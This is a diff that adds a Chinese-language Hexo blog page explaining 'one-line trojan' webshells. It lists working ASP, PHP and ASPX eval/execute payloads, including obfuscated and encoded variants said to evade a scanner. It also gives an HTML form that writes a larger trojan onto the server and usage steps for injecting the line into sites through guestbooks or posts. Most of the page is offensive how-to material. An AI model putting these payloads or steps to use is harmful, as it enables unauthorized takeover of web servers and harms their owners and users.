@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html>
+    <!-- Head -->
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content="">
+
+    <!-- Page Title -->
+    
+        <title>一句话木马的原理及利用 | Hexo</title>
+    
+    <link rel="icon" href="/img/avatar-default.png">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+    
+    
+<script src="/js/script.js"></script>
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    <style>
+        .deactiveColor{
+            color: #37474f;
+        }
+        .activeColor{
+            color: #006064;
+        }
+        a:hover{
+            color: #006064;
+        }
+        .header-btn{
+            color: #37474f;
+        }
+        
+        .post-content img{
+            margin: 50px auto;
+        }
+        
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+    <body>
+        <div class="container">
+
+            <!-- Top Anchor -->
+            <div id="top"></div>
+
+            <!-- Header -->
+            <header class="header-wrapper">
+    <div class="header-title-wrapper">
+        <!-- Page Title -->
+        <p class="header-title">
+             
+                
+                    一句话木马的原理及利用
+                
+            
+        </p>  
+    </div>    
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+    
+    <div class="header-detail">
+        <!-- Header Button -->
+        <div class="header-btn-wrapper">
+            
+                <span>
+                    <a class="home-btn header-btn" href="/" title="homepage"><i class="fa fa-home"></i></a>
+                </span>
+
+                
+                    <span>
+                        <a class="catalog-btn header-btn"><i class="fa fa-list-ul"></i></a>
+                    </span>
+                
+            
+        </div>
+    </div>
+</header>
+
+            <!-- Main -->
+            <main>
+                <article class="post-wrapper">
+    
+
+    
+        <!-- Article Catalog -->
+        <div class="catalog-dropdown col-xs-12 col-sm-12">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#一句话木马的原理及利用"><span class="toc-number">1.</span> <span class="toc-text">一句话木马的原理及利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一句话木马的举例说明："><span class="toc-number">1.0.1.</span> <span class="toc-text">一句话木马的举例说明：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一句话木马的工作原理："><span class="toc-number">1.0.2.</span> <span class="toc-text">一句话木马的工作原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用写法："><span class="toc-number">1.0.3.</span> <span class="toc-text">常用写法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用方法："><span class="toc-number">1.0.4.</span> <span class="toc-text">使用方法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用环境："><span class="toc-number">1.0.5.</span> <span class="toc-text">使用环境：</span></a></li></ol></li></ol></li></ol>
+        </div>
+    
+
+    
+        <!--For now, Lightbox Only Show in Post Layout -->
+        
+
+        
+        
+    
+
+    
+
+    <!-- Article Content -->
+    <div class="post-content">
+        <h1 id="一句话木马的原理及利用"><a href="#一句话木马的原理及利用" class="headerlink" title="一句话木马的原理及利用"></a>一句话木马的原理及利用</h1><h3 id="一句话木马的举例说明："><a href="#一句话木马的举例说明：" class="headerlink" title="一句话木马的举例说明："></a>一句话木马的举例说明：</h3><p>黑客在注册信息的电子邮箱或者个人主页等中插入类似如下代码：<br>&lt;%execute request(“value”)%&gt;<br>其中value是值，所以你可以更改自己的值，前面的request就是获取这个值<br>&lt;%eval request(“value”)%&gt;(现在比较多见的，而且字符少，对表单字数有限制的地方特别的实用)<br>当知道了数据库的URL，就可以利用本地一张网页进行连接得到Webshell。（不知道数据库也可以，只要知道&lt;%eval request(“value”)%&gt;这个文件被插入到哪一个ASP文件里面就可以了。）<br>这就被称为一句话木马，它是基于B/S结构的。</p>
+<h3 id="一句话木马的工作原理："><a href="#一句话木马的工作原理：" class="headerlink" title="一句话木马的工作原理："></a>一句话木马的工作原理：</h3><p>“一句话木马”服务端（本地的html提交文件）<br>就是我们要用来插入到asp文件中的asp语句，（不仅仅是以asp为后缀的数据库文件），该语句将回为触发，接收入侵者通过客户端提交的数据，执行并完成相应的操作，服务端的代码内容为   &lt;%execute request(“value”)%&gt;   其中value可以自己修改</p>
+<p>“一句话木马”客户端（远程服务器上被插入一句话的asp文件）<br>用来向服务端提交控制数据的，提交的数据通过服务端构成完整的asp功能语句并执行，也就是生成我们所需要的asp木马文件</p>
+<p>现在先假设在远程主机的TEXT.ASP(客户端）中已经有了&lt;%execute request(“value”)%&gt;这个语句.)在ASP里&lt;%execute …………”)%&gt;意思是执行省略号里的语句.那么如果我写进我们精心构造的语句,它也是会帮我们执行的.就按照这上面的思路,我们就可以在本地构造一个表单内容如下:(//为注释)</p>
+<pre><code>&lt;form action=http://主机路径/TEXT.asp method=post&gt;
+
+&lt;textarea name=value cols=120 rows=10 width=45&gt;
+
+set lP=server.createObject(&quot;Adodb.Stream&quot;)//建立流对象
+lP.Open //打开
+lP.Type=2 //以文本方式
+lP.CharSet=&quot;gb2312&quot; //字体标准
+lP.writetext request(&quot;newvalue&quot;)
+
+lP.SaveToFile server.mappath(&quot;newmm.asp&quot;),2 //将木马内容以覆盖文件的方式写入newmm.asp，2就是已覆 盖的方式
+lP.Close //关闭对象
+set lP=nothing //释放对象
+response.redirect &quot;newmm.asp&quot; //转向newmm.asp
+
+&lt;/textarea&gt;
+
+&lt;textarea name=newvalue cols=120 rows=10 width=45&gt;添入生成木马的内容&lt;/textarea&gt;&lt;BR&gt;&lt;center&gt;&lt;br&gt;
+&lt;input type=submit value=提交&gt;
+
+&lt;/form&gt;</code></pre><p>表单的作用就是把我们表单里的内容提交到远程主机的TEXT.ASP这个文件.然后因为TEXT.ASP里有&lt;%execute request(“value”)%&gt;这句,那么这句代码就会执行我们从表单里传来的内容哦.(表单名必须和&lt;%execute request(“value”)%&gt;里的VALUE一样,就是我用蓝色标记的那两处,必须相等)</p>
+<p>说到这里大家是不是清楚了.我们构造了两个表单,第一个表单里的代码是文件操作的代码(就是把第二个表单内的内容写入在当前目录下并命名为newvalue.ASP的这么一段操作的处理代码)那么第二个表单当然就是我们要写入的马了.</p>
+<p>具体的就是下面这一段:</p>
+<pre><code>set lP=server.createObject(&quot;Adodb.Stream&quot;)//建立流对象
+lP.Open //打开
+lP.Type=2 //以文本方式
+lP.CharSet=&quot;gb2312&quot; //字体标准
+lP.writetext request(&quot;newvalue&quot;)
+
+lP.SaveToFile server.mappath(&quot;newvalue.asp&quot;),2 //将木马内容以覆盖文件的方式写入newmm.asp，2就是已覆 盖的方式
+lP.Close //关闭对象
+set lP=nothing //释放对象
+response.redirect &quot;newmm.asp&quot; //转向newmm.asp</code></pre><p>这样的话第二个表单的名字必须和lP.writetext request(“newvalue”) 里的Newvalue一样,就是我用红色标注的那两处.<br>至此只要服务器有写的权限你表单所提交的大马内容就会被写入到newmm.asp中。即newmm.asp为我们的shell地址。</p>
+<h3 id="常用写法："><a href="#常用写法：" class="headerlink" title="常用写法："></a>常用写法：</h3><p>asp一句话木马：&lt;%execute(request(“value”))%&gt;<br>php一句话木马：<?php @eval($_POST[value]);?><br>aspx一句话木马：<br>　　&lt;%@ Page Language=”Jscript”%&gt;<br>　　&lt;%eval(Request.Item[“value”])%&gt;<br>其他一句话木马：</p>
+<pre><code>&lt;%eval request(&quot;value&quot;)%&gt;
+　　&lt;%execute request(&quot;value&quot;)%&gt;
+　　&lt;%execute(request(&quot;value&quot;))%&gt;
+　　&lt;%If Request(&quot;value&quot;)&lt;&gt;&quot;&quot; Then Execute(Request(&quot;value&quot;))%&gt;
+　　&lt;%if request (&quot;value&quot;)&lt;&gt;&quot;&quot;then session(&quot;value&quot;)=request(&quot;value&quot;):end if:if session(&quot;value&quot;)&lt;&gt;&quot;&quot; then execute session(&quot;value&quot;)%&gt;
+　　&lt;SCRIPT language=VBScript runat=&quot;server&quot;&gt;execute request(&quot;value&quot;)&lt;/SCRIPT&gt;
+　　&lt;%@ Page Language=&quot;Jscript&quot;%&gt;
+　　&lt;%eval(Request.Item[&quot;value&quot;],&quot;unsafe&quot;);%&gt; </code></pre><p>可以躲过雷客图的一句话木马：</p>
+<pre><code>　　&lt;%
+　　set ms = server.CreateObject(&quot;MSScriptControl.ScriptControl.1&quot;)
+　　ms.Language=&quot;VBScript&quot;
+　　ms.AddObject &quot;Response&quot;, Response
+　　ms.AddObject &quot;request&quot;, request
+　　ms.ExecuteStatement(&quot;ev&quot;&amp;&quot;al(request(&quot;&quot;value&quot;&quot;))&quot;)
+　　%&gt;</code></pre><p>不用’&lt;,&gt;’的asp一句话木马：</p>
+<p>　　<script language=VBScript runat=server>execute request("value")</script><br>不用双引号的一句话木马：&lt;%eval request(chr(35))%&gt;<br>UTF-7编码加密:<br>&lt;%@ codepage=65000%&gt;&lt;% response.Charset=”936″%&gt;&lt;%e+j-x+j-e+j-c+j-u+j-t+j-e+j-(+j-r+j-e+j-q+j-u+j-e+j-s+j-t+j-(+j-+ACI-#+ACI)+j-)+j-%&gt;</p>
+<h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><p>首先,找到数据库是asp格式的网站,然后,以留言板,或者发表文章的方式,把一句话添加到asp数据库，或者加进asp网页.<br>记住!我们的目的是把一句话&lt;%execute request(“value”)%&gt;添加到数据库,无论任何方式!<br>然后打开客户端(就是你电脑上面的那个htm文件),填上加入了一句话的asp文件,或者是asp网页,然后进入此网站服务器。</p>
+<h3 id="使用环境："><a href="#使用环境：" class="headerlink" title="使用环境："></a>使用环境：</h3><p>1.服务器的来宾账户有写入权限<br>2.已知数据库地址且数据库格式为asa或asp<br>3.在数据库格式不为asp或asa的情况下，如果能将一句话插入到asp文件中.</p>
+<p><a href="https://www.cnblogs.com/milantgh/p/3629199.html" target="_blank" rel="noopener">参考博客</a></p>
+<p><a href="https://baike.baidu.com/item/一句话木马/1845646?fr=aladdin" target="_blank" rel="noopener">参考网址</a></p>
+  
+    </div> 
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+
+    <div class="post-info-wrapper">
+            
+                    <!-- Post Info -->
+                    <p class="post-date">2020-05-14</p>
+                    
+                    
+                        <p class="post-info-categories">
+                            
+                        </p>
+                    
+
+                    
+            
+    </div>
+</article>
+
+
+    
+
+            </main>
+
+            <!-- 'To Top' Btn-->
+            
+                <div id="to-top">
+    <a href="#top" class="toTop">
+        <i class="fa fa-pagelines"></i>
+    </a>
+</div>
+            
+
+            <!-- Footer -->
+            
+                <footer class="footer-wrapper col-xs-12 col-sm-12">
+    <div class="footer-banner-wrapper">
+        <p class="footer-banner">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener" title="Hexo">Hexo</a></p>
+        <P class="footer-banner">Theme <a href="https://github.com/Lonezj/hexo-theme-wind" target="_blank" rel="noopener" title="Wind">wind</a></P>
+    </div>
+</footer>
+            
+        </div>
+
+        <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css">
+        <link rel="stylesheet" href="/css/google-prettify-monokai.css" type="text/css">
+        <script src="//cdn.bootcss.com/prettify/r298/prettify.min.js" type="text/javascript"></script>
+    </body>
+</html>
